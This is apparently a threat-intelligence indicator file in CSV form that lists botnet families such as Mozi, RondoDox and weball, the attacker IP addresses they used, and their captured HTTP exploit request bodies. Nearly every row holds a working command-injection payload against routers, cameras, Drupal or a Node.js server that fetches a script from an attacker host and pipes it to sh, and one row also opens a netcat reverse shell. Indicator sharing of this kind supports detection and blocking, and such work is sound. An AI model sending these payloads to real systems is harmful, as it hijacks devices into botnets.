Threat,Indicator Type,Indicator
arm,HTTP RequestBody,dwTimeZone=2&dwGainType=0&szSrvIpAddr=time.windows.com%3B%24%28cd+%2Ftmp%3Bwget+http%3A%2F%2F130.12.180.20:36695%2Farm7%3Bchmod+777+*%3B.%2Farm7%3B%29&NTP_Update_time_hh=5&NTP_Update_time_mm=10&szDateM=2024%2F08%2F07&szTimeM=14%3A25%3A16&bDateFomat=0&bDateFormatMisc=0&dwIsDelay=1&Montype=0&submit=Apply
"arm, cat",IP,130.12.180.20
cat,HTTP RequestBody,"{""action"":""set_online"",""data"":{""agree"":1,""check_ip1"":""8.2.8.8"",""check_ip2"":""$(cd /tmp; wget http://130.12.180.20:36695/cat.sh -O- |sh; curl -O http://130.12.180.20:36695/cat.sh; chmod 777 cat.sh; sh cat.sh;)"",""enable"":1,""interval"":""10"",""reboot_interval"":""30""}}"
hiddenbin,HTTP RequestBody,IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F134.209.96.175%2Fhiddenbin%2Fzte.mips+-O+%2Fvar%2Ftmp%2Finit.norm&CmdAck=
"hiddenbin, ohshit",IP,134.209.96.175
Mozi,HTTP RequestBody,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://103.175.29.33:36546/Mozi.m+-O+->/tmp/gpon80;
Mozi,HTTP RequestBody,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://103.197.113.153:45987/Mozi.m+-O+->/tmp/gpon8
Mozi,HTTP RequestBody,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://103.197.113.173:43619/Mozi.m+-O+->/tmp/gpon8
Mozi,HTTP RequestBody,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://117.206.136.199:58591/Mozi.m+-O+->/tmp/gpon8
Mozi,HTTP RequestBody,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://120.56.4.194:37622/Mozi.m+-O+->/tmp/gpon80;s
Mozi,HTTP RequestBody,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://14.205.104.200:39332/Mozi.m+-O+->/tmp/gpon80
Mozi,HTTP RequestBody,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://182.116.69.97:48157/Mozi.m+-O+->/tmp/gpon80;
Mozi,IP,14.205.104.200
Mozi,IP,103.175.29.33
Mozi,IP,103.197.113.153
Mozi,IP,103.197.113.173
Mozi,IP,117.206.136.199
Mozi,IP,120.56.4.194
Mozi,IP,182.116.69.97
ohshit,HTTP RequestBody,submit_button=time_settings&change_action=gozila_cgi&next_page=time_settings.asp&adj_time_year=%24%28wget%24%7BIFS%7Dhttp%3A%2F%2F134.209.96.175%2Fohshit.sh%24%7BIFS%7D-O%24%7BIFS%7D%2Ftmp%2F.s%3Bsh%24%7BIFS%7D%2Ftmp%2F.s%29
ohshit,HTTP RequestBody,"time=%24%28wget%24%7BIFS%7Dhttp%3A%2F%2F134.209.96.175%2Fohshit.sh%24%7BIFS%7D-O%24%7BIFS%7D%2Ftmp%2F.s%3Bsh%24%7BIFS%7D%2Ftmp%2F.s%29,3"
RondoDox,HTTP RequestBody,(wget -qO- http://41.231.37.153/rondo.aqu.sh||busybox wget -qO- http://41.231.37.153/rondo.aqu.sh||curl -s http://41.231.37.153/rondo.aqu.sh)|sh&')
RondoDox,HTTP RequestBody,(wget -qO- http://41.231.37.153/rondo.dgx.sh||busybox wget -qO- http://41.231.37.153/rondo.dgx.sh||curl -s http://41.231.37.153/rondo.dgx.sh)|sh&
RondoDox,HTTP RequestBody,(wget -qO- http://41.231.37.153/rondo.xcw.sh||busybox wget -qO- http://41.231.37.153/rondo.xcw.sh||curl -s http://41.231.37.153/rondo.xcw.sh)|sh&amp;</string>
RondoDox,HTTP RequestBody,"{""action"":""set_timesetting"",""data"":{""ntpserver0"":""`wget -qO- http://41.231.37.153/rondo.cgc.sh|sh`"",""ntpserver1"":""time1.google.com"",""timezone"":""UTC-8""}}"
RondoDox,HTTP RequestBody,"{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B1337\""}"",""_response"":{""_prefix"":""process.mainModule.require('child_process').execSync('(wget -qO- http://41.231.37.153/rondo.aqu.sh||busybox wget -qO- http://41.231.37.153/rondo.aqu.sh||curl -s http://41.231.37.153/rondo.aqu.sh)|sh&');"",""_chunks"":""$Q2"",""_formData"":{""get"":""$1:constructor:constructor""}}}"
RondoDox,HTTP RequestBody,<?php system('(wget -qO- http://41.231.37.153/rondo.dtm.sh||busybox wget -qO- http://41.231.37.153/rondo.dtm.sh||curl -s http://41.231.37.153/rondo.dtm.sh)|sh&'); ?>
RondoDox,HTTP RequestBody,action=ApplyTake&change_action=gozila_cgi&del_value=&next_page=Diagnostics.asp&ping_ip=busybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.gvt.sh%7Csh%26&submit_button=Ping&submit_type=start
RondoDox,HTTP RequestBody,adj_time_sec=32&change_action=gozila_cgi&adj_time_day=27&adj_time_mon=10&adj_time_hour=11&adj_time_year=%24%28busybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.gvt.sh%7Csh%29&adj_time_min=35&submit_button=index&action=Save&submit_type=adjust_sys_time
RondoDox,HTTP RequestBody,C1=ON&cmd=cgi_ntp_time&f_ntp_server=%60wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.djc.sh%7Csh%60
RondoDox,HTTP RequestBody,cgiName=time_tzsetup.cgi&page=%2Fcfg_system_time.htm&id=69&ntp=%60curl%20-s%20http%3A%2F%2F41.231.37.153%2Frondo.qyt.sh%7Csh%60&ntp1=time.stdtime.gov.tw&ntp2=%600123456789ABCDEF%60&isEnabled=0&timeDiff=%2B9&ntpAutoSync=1&ntpSyncMode=1&day=0&hour=0&min=0&syncDiff=30
RondoDox,HTTP RequestBody,command=%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.dcd.sh%7Csh%26echo%20
RondoDox,HTTP RequestBody,command=busybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.qyz.sh%7Csh%26&SystemCommandSubmit=Apply
RondoDox,HTTP RequestBody,f_smtpserver=%3Bwget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.djc.sh%7Csh%26
RondoDox,HTTP RequestBody,form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=%28wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.bxf.sh%7C%7Ccurl%20-s%20http%3A%2F%2F41.231.37.153%2Frondo.bxf.sh%29%7Csh%26
RondoDox,HTTP RequestBody,html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0Abusybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.zta.sh%7Csh%26
RondoDox,HTTP RequestBody,macAddress=112233445566%3Bbusybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.tha.sh%7Csh%20%23&reginfo=0&writeData=Submit
RondoDox,HTTP RequestBody,page=login&newUI=0&username=admin&password=password&hostname=localhost&ipaddr=127.0.0.1&homepage=index&sysinitpage=index&wizardpage=index&login_page=index&lang_select=0&langChange=0&key=%27%20%60wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.rtg.sh%7Csh%60%20%23
RondoDox,HTTP RequestBody,page=system.html&c32_Titlename=Camera1&i_TitleShow=&i_Language=0&i_OSD_En=0&i_OSDPos=0&OSD_Video_En=0&i_OSDdata_format=0&i_TimeZone=GMT%2B02%3A00&oTimeZone=GMT%2B02%3A00&uc_Daylight_En=0&uc_DaylightBM=3&uc_DaylightBW=1&uc_DaylightBD=0&uc_DaylightBTH=0&uc_DaylightEM=11&uc_DaylightEW=0&uc_DaylightED=6&uc_DaylightETH=0&i_UseNtp=1&c64_Ntp_Server=%24%28busybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.kmh.sh%7Csh%29&ui_Ntp_Updata=5&i_Time_Shift=1&sDate=2024%2F08%2F22&sTime=18%3A38%3A08&mDate=2024%2F08%2F22&mTime=18%3A37%3A07&LEDindicator=0&TimeZone=-120&Timesync=&RedirectUrl=&action=Apply
RondoDox,HTTP RequestBody,src_file=result&cmd_save=func%20get%20ping%20%60wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.rfg.sh%7Csh%60%3B&_=0.0038560533468083857
RondoDox,HTTP RequestBody,sysCmd=wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.rbv.sh%7Csh%26&apply=Apply&msg=
RondoDox,HTTP RequestBody,time_mode=0&time_YEAR=0&time_MONTH=0&time_DAY=0&time_HOUR=0&time_MINUTE=0&time_SECOND=0&TIMEZONE=50&year=&month=&day=&CONFIGURE_NTP=on&SPECIFIC_SERVER=%24%28wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.qbq.sh%7Csh%29&CONFIGURE_NTP_SYNC_BY_PRESET_TIME=on&SYNC_PRESET_TIME_HOURS=0
RondoDox,HTTP RequestBody,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=%3B%60busybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.zxb.sh%7Csh%60%3B&ipv=0
RondoDox,IP,41.231.37.153
sh,HTTP RequestBody,(wget --no-check-certificate -qO- https://178.16.55.224/sh || curl -sk https://178.16.55.224/sh) | sh -s apache.selfrep
sh,IP,178.16.55.224
weball,HTTP RequestBody,"{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B1337\""}"",""_response"":{""_prefix"":""process.mainModule.require('child_process').execSync('cd /tmp; wget -O /tmp/x.sh http://94.154.35.154/weball.sh ; chmod +x /tmp/x.sh; sh /tmp/x.sh; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 193.142.147.209 12323 >/tmp/f');"",""_formData"":{""get"":""$1:constructor:constructor""}}}"
weball,IP,94.154.35.154
weball,IP,193.142.147.209
